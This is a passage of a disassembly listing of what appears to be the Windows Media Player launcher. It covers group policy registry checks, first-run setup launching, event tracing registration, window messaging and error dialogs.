		push	offset aSoftwarePolici ; "SOFTWARE\\Policies\\Microsoft\\WindowsM"...
		push	80000002h
		call	ebx ; RegOpenKeyExW
		test	eax, eax
		jnz	loc_1001A22
		push	4
		pop	esi
		lea	eax, [ebp+var_C]
		push	eax
		lea	eax, [ebp+var_14]
		push	eax
		lea	eax, [ebp+var_10]
		push	eax
		push	0
		push	offset aGroupprivacyac ; "GroupPrivacyAcceptance"
		push	[ebp+var_8]
		mov	[ebp+var_C], esi
		call	ds:RegQueryValueExW
		test	eax, eax
		jnz	short loc_1001B47
		cmp	[ebp+var_10], esi
		jnz	short loc_1001B47
		cmp	[ebp+var_14], 1
		jnz	short loc_1001B47
		mov	[ebp+var_1], al

loc_1001B47:				; CODE XREF: sub_10011DF+958j
					; sub_10011DF+95Dj ...
		push	[ebp+var_8]
		call	ds:RegCloseKey
		jmp	loc_1001A22
; END OF FUNCTION CHUNK	FOR sub_10011DF
; ---------------------------------------------------------------------------
		align 4
aSoftwarePolici:			; DATA XREF: sub_10011DF+920o
		unicode	0, <SOFTWARE\Policies\Microsoft\WindowsMediaPlayer>,0
		align 4
aGroupprivacyac:			; DATA XREF: sub_10011DF+945o
		unicode	0, <GroupPrivacyAcceptance>,0
		align 4

loc_1001BE8:				; CODE XREF: .text:01001772j
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 248h
		mov	eax, dword_1004040
		xor	eax, ebp
		mov	[ebp-4], eax
		push	ebx
		push	esi
		push	edi
		push	offset dword_1004050
		push	offset dword_1004058
		push	offset sub_100261A
		push	offset dword_1002210
		call	sub_1002671
		xor	ebx, ebx
		mov	esi, 10000h
		cmp	dword_100407C, ebx
		jz	loc_1001777
		mov	al, byte_1004080
		cmp	al, 4
		jnb	short loc_1001C3D
		cmp	al, bl
		jnz	loc_1001777

loc_1001C3D:				; CODE XREF: .text:01001C33j
		mov	eax, dword_1004068
		and	eax, esi
		or	eax, ebx
		jz	loc_1001777
		mov	eax, dword_1004070
		mov	ecx, eax
		and	ecx, esi
		cmp	ecx, eax
		jnz	loc_1001777
		cmp	ebx, dword_1004074
		jnz	loc_1001777
		push	offset dword_1002220
		push	dword_1004054
		push	dword_1004050
		call	sub_10026CE
		jmp	loc_1001777
; ---------------------------------------------------------------------------

loc_1001C84:				; CODE XREF: .text:01001789j
		push	edi
		call	ds:SetEvent
		push	edi
		call	ds:CloseHandle
		jmp	loc_100178F
; ---------------------------------------------------------------------------

loc_1001C97:				; CODE XREF: .text:0100180Dj
		cmp	[ebp-195h], bl
		jnz	loc_1001813

loc_1001CA3:				; CODE XREF: .text:0100183Fj
					; .text:01001D13j ...
		cmp	dword_100407C, ebx
		jz	short loc_1001CEE
		mov	al, byte_1004080
		cmp	al, 4
		jnb	short loc_1001CB8
		cmp	al, bl
		jnz	short loc_1001CEE

loc_1001CB8:				; CODE XREF: .text:01001CB2j
		mov	eax, dword_1004068
		and	eax, esi
		or	eax, ebx
		jz	short loc_1001CEE
		mov	eax, dword_1004070
		mov	ecx, eax
		and	ecx, esi
		cmp	ecx, eax
		jnz	short loc_1001CEE
		cmp	ebx, dword_1004074
		jnz	short loc_1001CEE
		push	offset dword_1002230
		push	dword_1004054
		push	dword_1004050
		call	sub_10026CE

loc_1001CEE:				; CODE XREF: .text:01001CA9j
					; .text:01001CB6j ...
		push	offset dword_1004050
		call	sub_100269D
		mov	ecx, [ebp-4]
		pop	edi
		pop	esi
		xor	ecx, ebp
		pop	ebx
		call	sub_1002928
		leave
		retn
; ---------------------------------------------------------------------------

loc_1001D07:				; CODE XREF: .text:0100181Aj
		mov	[ebp-1B0h], ebx
		cmp	[ebp-19Dh], bl
		jnz	short loc_1001CA3
		push	ebx
		push	ebx
		lea	eax, [ebp-1B0h]
		push	eax
		push	ebx
		push	0C0000002h
		push	ebx
		push	2900h
		call	ds:FormatMessageW
		test	eax, eax
		jz	loc_1001CA3
		push	offset aComctl32_dll ; "comctl32.dll"
		call	ds:LoadLibraryW
		push	10h
		push	offset aWindowsMediaPl ; "Windows Media	Player"
		push	dword ptr [ebp-1B0h]
		push	ebx
		call	ds:MessageBoxW
		push	dword ptr [ebp-1B0h]
		call	ds:LocalFree
		jmp	loc_1001CA3
; ---------------------------------------------------------------------------

loc_1001D68:				; CODE XREF: .text:0100186Fj
		mov	[ebp-1B0h], eax
		cmp	eax, ebx
		jnz	loc_1001418
		jmp	short loc_1001DCB
; ---------------------------------------------------------------------------

loc_1001D78:				; CODE XREF: .text:01001423j
		push	dword ptr [ebp-1B0h]
		call	ds:CloseHandle
		push	ebx
		push	offset aWmplayerapp ; "WMPlayerApp"
		mov	[ebp-1B0h], ebx
		call	ds:FindWindowW
		test	byte ptr [ebp-21Ch], 1
		jz	short loc_1001DAA
		xor	ecx, ecx
		cmp	cx, [ebp-218h]
		jz	short loc_1001DAC

loc_1001DAA:				; CODE XREF: .text:01001D9Dj
		xor	edi, edi

loc_1001DAC:				; CODE XREF: .text:01001DA8j
		cmp	eax, ebx
		jz	short loc_1001DBA
		cmp	edi, ebx
		jnz	short loc_1001DBA
		push	eax
		call	sub_1002787

loc_1001DBA:				; CODE XREF: .text:01001DAEj
					; .text:01001DB2j
		push	edi
		push	dword ptr [ebp-1A4h]
		call	sub_10026EF
		jmp	loc_1002177
; ---------------------------------------------------------------------------

loc_1001DCB:				; CODE XREF: .text:01001D76j
		call	ds:GetLastError
		cmp	eax, 5
		jz	loc_1002177

loc_1001DDA:				; CODE XREF: .text:01001429j
		push	edi
		mov	[ebp-1B8h], ebx
		mov	[ebp-1C4h], ebx
		mov	[ebp-1BCh], ebx
		mov	[ebp-19Ch], ebx
		call	ds:SetProcessDEPPolicy
		push	offset aMicrosoft_wind ; "Microsoft.Windows.MediaPlayer32"
		call	SetCurrentProcessExplicitAppUserModelID
		jmp	loc_100142E
; ---------------------------------------------------------------------------

loc_1001E09:				; CODE XREF: .text:010014DAj
		push	dword ptr [ebp-1A8h]
		call	ds:SetCurrentDirectoryW
		mov	[ebp-19Ch], eax
		jmp	loc_1001544
; ---------------------------------------------------------------------------

loc_1001E20:				; CODE XREF: .text:0100157Cj
		cmp	[ebp-19Ch], ebx
		jz	loc_1001F5A
		mov	[ebp-195h], bl
		mov	esi, offset aRunonce ; "/RunOnce:"
		mov	edi, offset aSetup_wm_exe ; "setup_wm.exe"
		cmp	[ebp-1A4h], ebx
		jz	loc_1001F32
		lea	eax, [ebp-1A8h]
		push	eax
		push	1
		push	esi
		call	ds:lstrlenW
		push	eax
		call	sub_10025EC
		test	eax, eax
		jl	loc_1001F32
		lea	eax, [ebp-1A8h]
		push	eax
		push	dword ptr [ebp-1A4h]
		call	ds:lstrlenW
		push	eax
		push	dword ptr [ebp-1A8h]
		call	sub_10025EC
		test	eax, eax
		jl	loc_1001F32
		lea	eax, [ebp-19Ch]
		push	eax
		mov	eax, [ebp-1A8h]
		push	2
		pop	ecx
		mul	ecx
		push	edx
		push	eax
		call	sub_10025BA
		test	eax, eax
		jl	loc_1001F32
		push	dword ptr [ebp-19Ch]
		push	ebx
		push	dword ptr [ebp-1B4h]
		call	ds:HeapAlloc
		mov	[ebp-1ACh], eax
		cmp	eax, ebx
		jz	short loc_1001F32
		push	esi
		push	dword ptr [ebp-1A8h]
		push	eax
		call	sub_10028AD
		push	dword ptr [ebp-1A4h]
		push	dword ptr [ebp-1A8h]
		push	dword ptr [ebp-1ACh]
		call	sub_10028E7
		push	0Ah
		push	ebx
		push	dword ptr [ebp-1ACh]
		push	edi
		push	offset aOpen	; "open"
		push	ebx
		call	ShellExecuteW
		cmp	eax, 20h
		jbe	short loc_1001F17
		mov	byte ptr [ebp-195h], 1
		mov	[ebp-196h], bl

loc_1001F17:				; CODE XREF: .text:01001F08j
		push	dword ptr [ebp-1ACh]
		push	ebx
		push	dword ptr [ebp-1B4h]
		call	ds:HeapFree
		cmp	[ebp-195h], bl
		jnz	short loc_1001F4E

loc_1001F32:				; CODE XREF: .text:01001E42j
					; .text:01001E60j ...
		push	0Ah
		push	ebx
		push	esi
		push	edi
		push	offset aOpen	; "open"
		push	ebx
		call	ShellExecuteW
		cmp	eax, 20h
		jbe	short loc_1001F4E
		mov	[ebp-196h], bl

loc_1001F4E:				; CODE XREF: .text:01001F30j
					; .text:01001F46j
		cmp	[ebp-196h], bl
		jz	loc_1002177

loc_1001F5A:				; CODE XREF: .text:01001576j
					; .text:01001E26j
		xor	eax, eax
		push	18Eh
		mov	[ebp-194h], ax
		lea	eax, [ebp-192h]
		push	ebx
		push	eax
		mov	[ebp-195h], bl
		mov	[ebp-196h], bl
		call	memset
		jmp	loc_1001614
; ---------------------------------------------------------------------------

loc_1001F86:				; CODE XREF: .text:01001644j
		lea	eax, [ebp-194h]
		push	eax
		push	202h
		call	ds:WSAStartup
		jmp	loc_100165C
; ---------------------------------------------------------------------------

loc_1001F9D:				; CODE XREF: .text:010016D8j
		mov	byte ptr [ebp-196h], 1
		jmp	loc_1001AC4
; ---------------------------------------------------------------------------

loc_1001FA9:				; CODE XREF: .text:01001AC6j
		call	esi
		test	eax, eax
		jnz	short loc_1001FB6

loc_1001FAF:				; CODE XREF: .text:010016C2j
					; .text:01001ACCj
		push	edi
		call	ds:FreeLibrary

loc_1001FB6:				; CODE XREF: .text:01001FADj
		cmp	[ebp-1E0h], ebx
		jnz	short loc_1001FC4
		call	ds:WSACleanup

loc_1001FC4:				; CODE XREF: .text:01001FBCj
		call	CoFreeUnusedLibraries
		call	OleUninitialize
		cmp	[ebp-195h], bl
		jnz	loc_1002177

loc_1001FDC:				; CODE XREF: .text:01001626j
		cmp	[ebp-19Dh], bl
		jnz	loc_1002177
		cmp	[ebp-196h], bl
		jz	short loc_1002043
		push	ebx
		push	ebx
		lea	eax, [ebp-19Ch]
		push	eax
		push	ebx
		push	0C0000004h
		push	ebx
		push	2900h
		mov	[ebp-19Ch], ebx
		call	ds:FormatMessageW
		test	eax, eax
		jz	loc_1002177
		push	offset aComctl32_dll ; "comctl32.dll"
		call	ds:LoadLibraryW
		push	10h
		push	offset aWindowsMediaPl ; "Windows Media	Player"
		push	dword ptr [ebp-19Ch]
		push	ebx
		call	ds:MessageBoxW
		push	dword ptr [ebp-19Ch]
		jmp	loc_1002171
; ---------------------------------------------------------------------------

loc_1002043:				; CODE XREF: .text:01001FEEj
		mov	eax, [ebp-1C0h]
		mov	esi, ds:FormatMessageW
		mov	[ebp-1A4h], ebx
		mov	edi, 2900h
		cmp	eax, ebx
		jz	loc_10020FB
		mov	[ebp-204h], eax
		mov	eax, [ebp-1CCh]
		shr	eax, 10h
		mov	[ebp-200h], eax
		movzx	eax, word ptr [ebp-1CCh]
		mov	[ebp-1FCh], eax
		mov	eax, [ebp-1D0h]
		shr	eax, 10h
		mov	[ebp-1F8h], eax
		movzx	eax, word ptr [ebp-1D0h]
		mov	[ebp-1F4h], eax
		mov	eax, [ebp-1D4h]
		shr	eax, 10h
		mov	[ebp-1F0h], eax
		movzx	eax, word ptr [ebp-1D4h]
		mov	[ebp-1ECh], eax
		mov	eax, [ebp-1C8h]
		shr	eax, 10h
		mov	[ebp-1E8h], eax
		movzx	eax, word ptr [ebp-1C8h]
		mov	[ebp-1E4h], eax
		lea	eax, [ebp-204h]
		push	eax
		push	ebx
		lea	eax, [ebp-1A4h]
		push	eax
		push	ebx
		push	0C0000003h
		push	ebx
		push	edi
		call	esi ; FormatMessageW
		mov	eax, [ebp-1A4h]
		cmp	eax, ebx
		jnz	short loc_1002107

loc_10020FB:				; CODE XREF: .text:0100205Cj
		mov	dword ptr [ebp-19Ch], offset dword_10022FC
		jmp	short loc_100210D
; ---------------------------------------------------------------------------

loc_1002107:				; CODE XREF: .text:010020F9j
		mov	[ebp-19Ch], eax

loc_100210D:				; CODE XREF: .text:01002105j
		lea	eax, [ebp-19Ch]
		push	eax
		push	ebx
		lea	eax, [ebp-1A4h]
		push	eax
		push	ebx
		push	0C0000001h
		push	ebx
		push	edi
		call	esi ; FormatMessageW
		test	eax, eax
		jz	short loc_1002163
		push	offset aComctl32_dll ; "comctl32.dll"
		call	ds:LoadLibraryW
		push	14h
		push	offset aWindowsMediaPl ; "Windows Media	Player"
		push	dword ptr [ebp-1A4h]
		push	ebx
		call	ds:MessageBoxW
		cmp	eax, 6
		jnz	short loc_1002163
		push	0Ah
		push	ebx
		push	ebx
		push	offset aHttpGo_microso ; "http://go.microsoft.com/fwlink/?LinkId="...
		push	offset aOpen	; "open"
		push	ebx
		call	ShellExecuteW

loc_1002163:				; CODE XREF: .text:01002128j
					; .text:0100214Cj
		cmp	[ebp-1A4h], ebx
		jz	short loc_1002177
		push	dword ptr [ebp-1A4h]

loc_1002171:				; CODE XREF: .text:0100203Ej
		call	ds:LocalFree

loc_1002177:				; CODE XREF: .text:01001DC6j
					; .text:01001DD4j ...
		cmp	[ebp-1C0h], ebx
		jz	short loc_1002192
		push	dword ptr [ebp-1C0h]
		push	ebx
		push	dword ptr [ebp-1B4h]
		call	ds:HeapFree

loc_1002192:				; CODE XREF: .text:0100217Dj
		cmp	[ebp-1B0h], ebx
		jz	short loc_10021A6
		push	dword ptr [ebp-1B0h]
		call	ds:CloseHandle

loc_10021A6:				; CODE XREF: .text:01002198j
		cmp	dword_100407C, ebx
		jz	short loc_10021F6
		mov	al, byte_1004080
		cmp	al, 4
		jnb	short loc_10021BB
		cmp	al, bl
		jnz	short loc_10021F6

loc_10021BB:				; CODE XREF: .text:010021B5j
		mov	eax, dword_1004068
		mov	edx, 10000h
		and	eax, edx
		or	eax, ebx
		jz	short loc_10021F6
		mov	eax, dword_1004070
		mov	ecx, eax
		and	ecx, edx
		cmp	ecx, eax
		jnz	short loc_10021F6
		cmp	ebx, dword_1004074
		jnz	short loc_10021F6
		push	offset dword_1002230
		push	dword_1004054
		push	dword_1004050
		call	sub_10026CE

loc_10021F6:				; CODE XREF: .text:010021ACj
					; .text:010021B9j ...
		push	offset dword_1004050
		call	sub_100269D
		push	dword ptr [ebp-1D8h]
		call	ds:ExitProcess
; ---------------------------------------------------------------------------
		align 10h
dword_1002210	dd 0F3F14FF3h, 48687B80h, 7ED7D091h, 5E027B49h ; DATA XREF: .text:01001C0Fo
dword_1002220	dd 30h,	12504h,	10000h,	0 ; DATA XREF: .text:01001C69o
dword_1002230	dd 31h,	12604h,	10000h,	0 ; DATA XREF: .text:01001CD8o
					; .text:010021E0o
aWindowsMediaPl:			; DATA XREF: .text:01001D45o
					; .text:01002026o ...
		unicode	0, <Windows Media Player>,0
		align 10h
aHttpGo_microso:			; DATA XREF: .text:01002152o
		unicode	0, <http://go.microsoft.com/fwlink/?LinkId=9996>,0
aSetup_wm_exe:				; DATA XREF: .text:01001E37o
		unicode	0, <setup_wm.exe>,0
		align 8
aRunonce:				; DATA XREF: .text:01001E32o
		unicode	0, </RunOnce:>,0
dword_10022FC	dd 90900000h		; DATA XREF: .text:loc_10020FBo
aOpen:					; DATA XREF: .text:01001EF9o
					; .text:01001F37o ...
		unicode	0, <open>,0
		align 10h
aMicrosoft_wind:			; DATA XREF: .text:01001DF9o
		unicode	0, <Microsoft.Windows.MediaPlayer32>,0
aComctl32_dll:				; DATA XREF: .text:01001D38o
					; .text:01002019o ...
		unicode	0, <comctl32.dll>,0
; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_1001242

loc_100236A:				; CODE XREF: sub_1001242+57j
		mov	eax, 0BB40E64Eh
		jmp	loc_10012A7
; END OF FUNCTION CHUNK	FOR sub_1001242
; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_10012CC

loc_1002374:				; CODE XREF: sub_10012CC+65j
		lea	eax, [ebp+var_44]
		mov	[ebp+arg_4], eax
		lea	eax, [ebp+arg_4]
		push	eax
		push	1
		push	ecx
		push	0C06D0057h
		call	ds:RaiseException
		xor	eax, eax
		jmp	loc_10013FA
; ---------------------------------------------------------------------------

loc_1002393:				; CODE XREF: sub_10012CC+95j
		movzx	eax, dx
		jmp	loc_1001367
; ---------------------------------------------------------------------------

loc_100239B:				; CODE XREF: sub_10012CC+A7j
		lea	edx, [ebp+var_44]
		push	edx
		push	ecx
		call	eax ; dword_1001414
		mov	ebx, eax
		test	ebx, ebx
		jz	loc_1001379
		jmp	loc_10013EB
; ---------------------------------------------------------------------------

loc_10023B1:				; CODE XREF: sub_10012CC+B8j
		lea	ecx, [ebp+var_44]
		push	ecx
		push	1
		call	eax ; dword_1001414
		jmp	loc_1001401
; ---------------------------------------------------------------------------

loc_10023BE:				; CODE XREF: sub_10012CC+CBj
		call	ds:GetLastError
		mov	[ebp+var_24], eax
		mov	eax, ds:dword_1001414
		test	eax, eax
		jz	short loc_10023E2
		lea	ecx, [ebp+var_44]
		push	ecx
		push	3
		call	eax ; dword_1001414
		mov	edi, eax
		test	edi, edi
		jnz	loc_100139D

loc_10023E2:				; CODE XREF: sub_10012CC+1102j
		lea	eax, [ebp+var_44]
		mov	[ebp+arg_4], eax
		lea	eax, [ebp+arg_4]
		push	eax
		push	1
		push	0
		push	0C06D007Eh
		call	ds:RaiseException
		mov	eax, [ebp+var_28]
		jmp	loc_10013FA
; ---------------------------------------------------------------------------

loc_1002403:				; CODE XREF: sub_10012CC+E3j
		push	8
		push	40h
		call	ds:LocalAlloc
		test	eax, eax
		jz	loc_10013B5
		mov	[eax+4], esi
		mov	ecx, dword_10043A4
		mov	[eax], ecx
		mov	dword_10043A4, eax
		jmp	loc_10013B5
; ---------------------------------------------------------------------------

loc_100242A:				; CODE XREF: sub_10012CC+F3j
		lea	ecx, [ebp+var_44]
		push	ecx
		push	2
		call	eax ; dword_1001414
		mov	ebx, eax
		jmp	loc_10013C5
; ---------------------------------------------------------------------------

loc_1002439:				; CODE XREF: sub_10012CC+100j
		cmp	[esi+1Ch], ebx
		jz	loc_10013D2
		mov	eax, [edi+3Ch]
		add	eax, edi
		cmp	dword ptr [eax], 4550h
		jnz	loc_10013D2
		mov	ecx, [ebp+var_4]
		cmp	[eax+8], ecx
		jnz	loc_10013D2
		cmp	edi, [eax+34h]
		jnz	loc_10013D2
		mov	eax, [ebp+var_C]
		mov	ecx, [ebp+arg_0]
		mov	ebx, [ecx+eax]
		test	ebx, ebx
		jz	loc_10013D2
		jmp	loc_10013E6
; ---------------------------------------------------------------------------

loc_100247E:				; CODE XREF: sub_10012CC+114j
		call	ds:GetLastError
		mov	[ebp+var_24], eax
		mov	eax, ds:dword_1001414
		test	eax, eax
		jz	short loc_100249A
		lea	ecx, [ebp+var_44]
		push	ecx
		push	4
		call	eax ; dword_1001414
		mov	ebx, eax

loc_100249A:				; CODE XREF: sub_10012CC+11C2j
		test	ebx, ebx
		jnz	loc_10013E6
		lea	eax, [ebp+var_44]
		mov	[ebp+arg_0], eax
		lea	eax, [ebp+arg_0]
		push	eax
		push	1
		push	ebx
		push	0C06D007Fh
		call	ds:RaiseException
		mov	ebx, [ebp+var_28]
		jmp	loc_10013E6
; ---------------------------------------------------------------------------

loc_10024C2:				; CODE XREF: sub_10012CC+126j
		and	[ebp+var_24], 0
		lea	ecx, [ebp+var_44]
		push	ecx
		push	5
		mov	[ebp+var_2C], edi
		mov	[ebp+var_28], ebx
		call	eax ; dword_1001414
		jmp	loc_10013F8
; END OF FUNCTION CHUNK	FOR sub_10012CC
; ---------------------------------------------------------------------------
		align 4
aWmplayerapp:				; DATA XREF: .text:01001D85o
					; sub_10026EF+Co
		unicode	0, <WMPlayerApp>,0
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================


sub_10024F9	proc near		; CODE XREF: sub_1002530+1Fp
		mov	edi, edi
		push	esi
		mov	esi, eax
		xor	eax, eax
		mov	ecx, edx
		test	edx, edx
		jz	short loc_1002514

loc_1002506:				; CODE XREF: sub_10024F9+15j
		cmp	[esi], ax
		jz	short loc_1002510
		inc	esi
		inc	esi
		dec	edx
		jnz	short loc_1002506

loc_1002510:				; CODE XREF: sub_10024F9+10j
		test	edx, edx
		jnz	short loc_1002519

loc_1002514:				; CODE XREF: sub_10024F9+Bj
		mov	eax, 80070057h

loc_1002519:				; CODE XREF: sub_10024F9+19j
		pop	esi
		test	edi, edi
		jz	short locret_100252A
		test	eax, eax
		jl	short loc_1002527
		sub	ecx, edx
		mov	[edi], ecx
		retn
; ---------------------------------------------------------------------------

loc_1002527:				; CODE XREF: sub_10024F9+27j
		and	dword ptr [edi], 0

locret_100252A:				; CODE XREF: sub_10024F9+23j
		retn
sub_10024F9	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1002530	proc near		; CODE XREF: sub_10028E7+17p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	edi
		mov	edi, eax
		xor	eax, eax
		test	edx, edx
		jz	short loc_1002543
		cmp	edx, [ebp+arg_4]
		jbe	short loc_1002548

loc_1002543:				; CODE XREF: sub_1002530+Cj
		mov	eax, 80070057h

loc_1002548:				; CODE XREF: sub_1002530+11j
		test	eax, eax
		jl	short loc_1002556
		mov	eax, [ebp+arg_0]
		call	sub_10024F9
		jmp	short loc_1002559
; ---------------------------------------------------------------------------

loc_1002556:				; CODE XREF: sub_1002530+1Aj
		and	dword ptr [edi], 0

loc_1002559:				; CODE XREF: sub_1002530+24j
		pop	edi
		pop	ebp
		retn	8
sub_1002530	endp

; ---------------------------------------------------------------------------
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1002563	proc near		; CODE XREF: sub_10028AD+2Cp
					; sub_10028E7+31p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		mov	ebx, eax
		mov	esi, edx
		xor	eax, eax
		xor	edi, edi
		test	esi, esi
		jz	short loc_1002598

loc_1002577:				; CODE XREF: sub_1002563+2Fj
		cmp	[ebp+arg_4], eax
		jz	short loc_1002594
		movzx	edx, word ptr [ebx]
		test	dx, dx
		jz	short loc_1002594
		mov	[ecx], dx
		inc	ecx
		inc	ecx
		inc	ebx
		inc	ebx
		dec	esi
		dec	[ebp+arg_4]
		inc	edi
		test	esi, esi
		jnz	short loc_1002577

loc_1002594:				; CODE XREF: sub_1002563+17j
					; sub_1002563+1Fj
		test	esi, esi
		jnz	short loc_10025A0

loc_1002598:				; CODE XREF: sub_1002563+12j
		dec	ecx
		dec	ecx
		dec	edi
		mov	eax, 8007007Ah

loc_10025A0:				; CODE XREF: sub_1002563+33j
		xor	edx, edx
		mov	[ecx], dx
		mov	ecx, [ebp+arg_0]
		test	ecx, ecx
		jz	short loc_10025AE
		mov	[ecx], edi

loc_10025AE:				; CODE XREF: sub_1002563+47j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	8
sub_1002563	endp

; ---------------------------------------------------------------------------
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10025BA	proc near		; CODE XREF: .text:01001EA1p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		cmp	[ebp+arg_4], 0
		ja	short loc_10025D8
		mov	eax, [ebp+arg_0]
		jb	short loc_10025CF
		cmp	eax, 0FFFFFFFFh
		ja	short loc_10025D8

loc_10025CF:				; CODE XREF: sub_10025BA+Ej
		mov	ecx, [ebp+arg_8]
		mov	[ecx], eax
		xor	eax, eax
		jmp	short loc_10025E3
; ---------------------------------------------------------------------------

loc_10025D8:				; CODE XREF: sub_10025BA+9j
					; sub_10025BA+13j
		mov	eax, [ebp+arg_8]
		or	dword ptr [eax], 0FFFFFFFFh
		mov	eax, 80070216h

loc_10025E3:				; CODE XREF: sub_10025BA+1Cj
		pop	ebp
		retn	0Ch
sub_10025BA	endp

; ---------------------------------------------------------------------------
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10025EC	proc near		; CODE XREF: .text:01001E59p
					; .text:01001E80p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		mov	eax, [ebp+arg_4]
		add	eax, ecx
		cmp	eax, ecx
		jb	short loc_1002606
		mov	ecx, [ebp+arg_8]
		mov	[ecx], eax
		xor	eax, eax
		jmp	short loc_1002611
; ---------------------------------------------------------------------------

loc_1002606:				; CODE XREF: sub_10025EC+Fj
		mov	eax, [ebp+arg_8]
		or	dword ptr [eax], 0FFFFFFFFh
		mov	eax, 80070216h

loc_1002611:				; CODE XREF: sub_10025EC+18j
		pop	ebp
		retn	0Ch
sub_10025EC	endp

; ---------------------------------------------------------------------------
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_100261A	proc near		; DATA XREF: .text:01001C0Ao

arg_4		= dword	ptr  0Ch
arg_8		= byte ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h
arg_20		= dword	ptr  28h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_20]
		xor	ecx, ecx
		cmp	eax, ecx
		jz	short loc_1002668
		mov	edx, [ebp+arg_4]
		sub	edx, ecx
		jz	short loc_1002656
		dec	edx
		jnz	short loc_1002668
		mov	cl, [ebp+arg_8]
		mov	[eax+28h], cl
		mov	ecx, [ebp+arg_C]
		mov	[eax+10h], ecx
		mov	ecx, [ebp+arg_10]
		mov	[eax+14h], ecx
		mov	ecx, [ebp+arg_14]
		mov	[eax+18h], ecx
		mov	ecx, [ebp+arg_18]
		mov	dword ptr [eax+24h], 1
		jmp	short loc_1002665
; ---------------------------------------------------------------------------

loc_1002656:				; CODE XREF: sub_100261A+13j
		mov	[eax+24h], ecx
		mov	[eax+28h], cl
		mov	[eax+10h], ecx
		mov	[eax+14h], ecx
		mov	[eax+18h], ecx

loc_1002665:				; CODE XREF: sub_100261A+3Aj
		mov	[eax+1Ch], ecx

loc_1002668:				; CODE XREF: sub_100261A+Cj
					; sub_100261A+16j
		pop	ebp
		retn	24h
sub_100261A	endp

; ---------------------------------------------------------------------------
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1002671	proc near		; CODE XREF: .text:01001C14p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_C]
		mov	ecx, [eax]
		or	ecx, [eax+4]
		jz	short loc_1002684
		xor	eax, eax
		jmp	short loc_1002694
; ---------------------------------------------------------------------------

loc_1002684:				; CODE XREF: sub_1002671+Dj
		push	eax
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	ds:EventRegister

loc_1002694:				; CODE XREF: sub_1002671+11j
		pop	ebp
		retn	10h
sub_1002671	endp

; ---------------------------------------------------------------------------
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_100269D	proc near		; CODE XREF: .text:01001CF3p
					; .text:010021FBp

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_0]
		mov	eax, [esi]
		mov	ecx, [esi+4]
		mov	edx, eax
		or	edx, ecx
		jnz	short loc_10026B5
		xor	eax, eax
		jmp	short loc_10026C4
; ---------------------------------------------------------------------------

loc_10026B5:				; CODE XREF: sub_100269D+12j
		push	ecx
		push	eax
		call	ds:EventUnregister
		and	dword ptr [esi], 0
		and	dword ptr [esi+4], 0

loc_10026C4:				; CODE XREF: sub_100269D+16j
		pop	esi
		pop	ebp
		retn	4
sub_100269D	endp

; ---------------------------------------------------------------------------
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10026CE	proc near		; CODE XREF: .text:01001C7Ap
					; .text:01001CE9p ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	0
		push	0
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	ds:EventWrite
		pop	ebp
		retn	0Ch
sub_10026CE	endp

; ---------------------------------------------------------------------------
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10026EF	proc near		; CODE XREF: .text:01001DC1p

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		push	0
		push	offset aWmplayerapp ; "WMPlayerApp"
		mov	esi, 80004005h
		call	ds:FindWindowW
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_100277A
		mov	esi, [ebp+arg_0]
		push	esi
		mov	[ebp+var_C], 1
		call	ds:lstrlenW
		lea	eax, [eax+eax+2]
		mov	[ebp+var_8], eax
		lea	eax, [ebp+arg_0]
		push	eax
		push	1D4C0h
		push	3
		lea	eax, [ebp+var_C]
		push	eax
		push	[ebp+arg_4]
		mov	[ebp+var_4], esi
		push	4Ah
		push	ebx
		call	ds:SendMessageTimeoutW
		test	eax, eax
		jnz	short loc_100276C
		call	ds:GetLastError
		test	eax, eax
		jnz	short loc_100275C
		mov	esi, 80004004h
		jmp	short loc_100277A
; ---------------------------------------------------------------------------

